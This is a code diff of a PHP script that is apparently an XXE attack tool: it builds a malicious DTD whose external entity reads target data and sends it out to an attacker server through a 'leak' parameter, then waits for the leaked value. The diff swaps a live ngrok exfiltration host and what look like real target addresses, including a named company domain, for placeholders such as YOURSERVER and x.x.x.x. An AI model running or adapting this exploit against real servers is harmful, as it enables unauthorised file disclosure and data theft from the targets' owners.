@@ -9,14 +9,14 @@
   </form>
 
   <?php
-  function payload_call($path = 'xxe.xml', $target = 'www.dyson.cn')
+  function payload_call($path, $target)
   {
     global $cnext;
     file_put_contents(
       'dtd.xml',
       "
 <!ENTITY % data SYSTEM \"$cnext\">
-<!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'https://5751-156-197-181-134.ngrok-free.app/cnext.php?leak=%data;'>\">
+<!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'YOURSERVER/cnext.php?leak=%data;'>\">
 "
     );
 
@@ -26,7 +26,7 @@
           "collectorList" => array(
             "totalCollector" => array(
               "sourceData" => array(
-                "data" => "https://5751-156-197-181-134.ngrok-free.app/$path",
+                "data" => "YOURSERVER/$path",
                 "dataIsURL" => true,
                 "options" => 1337
               )
@@ -58,7 +58,7 @@
       echo '</pre>';
     }
 
-    print_r($response . '<br><br>');
+    // print_r($response . '<br><br>');
     curl_close($ch);
   }
 
@@ -67,7 +67,7 @@
     if (empty($cnext)) {
       echo "file is empty";
     } else {
-      payload_call('xxe.xml', '3.105.50.154');
+      payload_call('xxe.xml', 'x.x.x.x');
 
       // Wait for the leak parameter to be received
       $leak = '';
